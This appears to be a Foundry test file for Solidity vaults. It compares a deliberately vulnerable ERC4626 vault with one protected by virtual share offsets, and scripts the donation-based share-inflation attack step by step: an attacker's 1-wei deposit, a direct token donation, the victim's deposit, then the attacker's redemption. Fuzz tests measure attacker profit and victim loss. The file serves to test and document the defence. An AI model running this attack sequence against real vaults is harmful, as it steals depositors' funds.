// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {MockToken} from "../src/MockToken.sol";
import {NaiveVault} from "../src/NaiveVault.sol";
import {SafeVault} from "../src/SafeVault.sol";
import {TestBase} from "./helpers/TestBase.sol";

contract InflationTest is TestBase {
    uint256 internal constant LIMIT = 1e27;
    address internal constant ATTACKER = address(0xA11CE);
    address internal constant VICTIM = address(0xB0B);
    MockToken internal token;

    struct Result {
        uint256 victimShares;
        uint256 attackerAssets;
        uint256 victimAssets;
        uint256 residual;
        int256 profit;
        int256 loss;
    }

    function setUp() public {
        token = new MockToken();
    }

    function testNaiveStealsEntireVictimDeposit() public {
        Result memory r = _run(false, 0, 1e18, 1e18);
        assertEq(r.victimShares, 0);
        assertEq(r.profit, int256(1e18));
        assertEq(r.loss, int256(1e18));
    }

    function testFuzzNaiveZeroSharesWhenVictimAtMostDonation(uint256 d, uint256 v) public {
        d = 1 + d % LIMIT;
        v = 1 + v % d;
        Result memory r = _run(false, 0, d, v);
        assertEq(r.victimShares, 0);
        assertEq(r.profit, int256(v));
        assertEq(r.loss, int256(v));
    }

    function testNaiveZeroShareBoundary() public {
        Result memory below = _run(false, 0, 100, 100);
        Result memory at = _run(false, 0, 100, 101);
        assertEq(below.victimShares, 0);
        assertEq(at.victimShares, 1);
        assertEq(at.profit, int256(0));
    }

    function testFuzzSafeOffset6NeverProfits(uint256 d, uint256 v) public {
        _run(true, 6, _bound(d), _bound(v));
    }

    function testFuzzSafeAllSupportedOffsetsNeverProfit(uint256 d, uint256 v, uint8 offset) public {
        _run(true, offset % 19, _bound(d), _bound(v));
    }

    function testSafeOffset6BoundaryGrid() public {
        uint256[8] memory values = [uint256(0), 1, 2, 1e6, 1e18, 1e24, LIMIT - 1, LIMIT];
        for (uint256 i; i < values.length; ++i) {
            for (uint256 j; j < values.length; ++j) {
                _run(true, 6, values[i], values[j]);
            }
        }
    }

    function testSafeZeroSharesStillPossibleAndCostly() public {
        uint256 v = 1e18;
        uint256 threshold = 2 * 1e6 * v - 1;
        Result memory beforeThreshold = _run(true, 6, threshold - 1, v);
        Result memory atThreshold = _run(true, 6, threshold, v);
        assertEq(beforeThreshold.victimShares, 1);
        assertEq(atThreshold.victimShares, 0);
        assertEq(atThreshold.loss, int256(v));
        require(atThreshold.profit < -int256(v), "attack should lose more than victim deposit");
    }

    /// @notice Exact wei-denominated Markdown rows used in docs/inflation.md.
    function testPrintInflationTable() public {
        emit log("| Vault | Offset | D (wei) | V (wei) | Attacker profit (wei) | Victim loss (wei) |");
        emit log("| --- | ---: | ---: | ---: | ---: | ---: |");
        uint256[3] memory donations = [uint256(1e18), 1e21, 1e24];
        uint256[2] memory victims = [uint256(1e18), 1e20];
        uint8[3] memory offsets = [uint8(0), 3, 6];
        for (uint256 i; i < donations.length; ++i) {
            for (uint256 j; j < victims.length; ++j) {
                _print(false, 0, donations[i], victims[j]);
                for (uint256 n; n < offsets.length; ++n) {
                    _print(true, offsets[n], donations[i], victims[j]);
                }
            }
        }
    }

    function _print(bool safe, uint8 offset, uint256 d, uint256 v) internal {
        Result memory r = _run(safe, offset, d, v);
        emit log(string.concat(
                "| ",
                safe ? "SafeVault" : "NaiveVault",
                " | ",
                safe ? vm.toString(uint256(offset)) : "n/a",
                " | ",
                vm.toString(d),
                " | ",
                vm.toString(v),
                " | ",
                vm.toString(r.profit),
                " | ",
                vm.toString(r.loss),
                " |"
            ));
    }

    function _run(bool safe, uint8 offset, uint256 d, uint256 v) internal returns (Result memory r) {
        ERC4626 vault = safe ? ERC4626(new SafeVault(token, offset)) : ERC4626(new NaiveVault(token));
        token.mint(ATTACKER, d + 1);
        token.mint(VICTIM, v);
        uint256 attackerStart = token.balanceOf(ATTACKER);
        uint256 victimStart = token.balanceOf(VICTIM);

        vm.startPrank(ATTACKER);
        token.approve(address(vault), type(uint256).max);
        uint256 attackerShares = vault.deposit(1, ATTACKER);
        assertEq(attackerShares, safe ? 10 ** uint256(offset) : 1);
        require(token.transfer(address(vault), d), "donation failed");
        vm.stopPrank();
        assertEq(vault.totalAssets(), d + 1);
        assertEq(vault.totalSupply(), attackerShares);

        vm.startPrank(VICTIM);
        token.approve(address(vault), v);
        r.victimShares = vault.deposit(v, VICTIM);
        vm.stopPrank();
        assertEq(vault.balanceOf(VICTIM), r.victimShares);
        assertEq(vault.totalAssets(), d + 1 + v);

        vm.prank(ATTACKER);
        r.attackerAssets = vault.redeem(attackerShares, ATTACKER, ATTACKER);
        r.profit = int256(token.balanceOf(ATTACKER)) - int256(attackerStart);
        assertEq(r.profit, int256(r.attackerAssets) - int256(d + 1));
        assertEq(vault.balanceOf(ATTACKER), 0);

        // Realize the victim's loss after the attack; include any residual virtual-share capture.
        vm.prank(VICTIM);
        r.victimAssets = vault.redeem(r.victimShares, VICTIM, VICTIM);
        r.loss = int256(victimStart) - int256(token.balanceOf(VICTIM));
        assertEq(r.loss, int256(v) - int256(r.victimAssets));
        r.residual = token.balanceOf(address(vault));
        assertEq(vault.totalAssets(), r.residual);
        assertEq(vault.totalSupply(), 0);
        assertEq(r.attackerAssets + r.victimAssets + r.residual, d + 1 + v);
        assertEq(r.loss - r.profit, int256(r.residual));
        _checkModel(r, safe, offset, d, v);
        if (safe) assertLe(r.attackerAssets, d + 1);
    }

    function _checkModel(Result memory r, bool safe, uint8 offset, uint256 d, uint256 v) internal pure {
        // Independent integer model: bounded inputs make these ordinary products overflow-safe.
        uint256 k = safe ? 10 ** uint256(offset) : 1;
        uint256 virtualShares = safe ? k : 0;
        uint256 virtualAssets = safe ? 1 : 0;
        uint256 q = v * (k + virtualShares) / (d + 1 + virtualAssets);
        uint256 redemption = k * (d + 1 + v + virtualAssets) / (k + q + virtualShares);
        uint256 victimRedemption = q == 0 ? 0 : q * (d + 1 + v - redemption + virtualAssets) / (q + virtualShares);
        assertEq(r.victimShares, q);
        assertEq(r.attackerAssets, redemption);
        assertEq(r.victimAssets, victimRedemption);
    }

    function _bound(uint256 value) internal pure returns (uint256) {
        return value <= LIMIT ? value : value % (LIMIT + 1);
    }
}
